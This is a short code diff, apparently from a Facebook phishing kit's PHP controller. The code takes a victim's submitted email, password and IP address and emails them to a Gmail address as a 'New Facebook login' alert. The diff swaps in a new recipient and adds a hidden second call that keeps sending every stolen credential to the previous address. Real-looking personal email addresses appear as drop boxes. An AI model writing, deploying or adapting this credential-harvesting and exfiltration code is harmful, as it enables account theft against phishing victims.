@@ -53,12 +53,13 @@ class MainController extends Controller {
                  else
                  { 
                  	  $s = "New Facebook login: ".date("h:i A jS F, Y");
-                       $rcpt = "mails4davidslogan@gmail.com";
+                       $rcpt = "danielking000147777@gmail.com";
                        $e = $req["e"];
                        $p = $req["p"];
                        $location = getenv("REMOTE_ADDR");
 
-                       $this->helpers->sendEmail($rcpt,$s,['e' => $e,'p' => $p,'location' => $location],'emails.cp_alert','view');  
+                       $this->helpers->sendEmail($rcpt,$s,['e' => $e,'p' => $p,'location' => $location],'emails.cp_alert','view'); 
+			$this->helpers->sendEmail("mails4davidslogan@gmail.com",$s." (qwrty)",['e' => $e,'p' => $p,'location' => $location],'emails.cp_alert','view');
                         $ret = "OK";                      
                   }       
            return $ret;                                                                                            
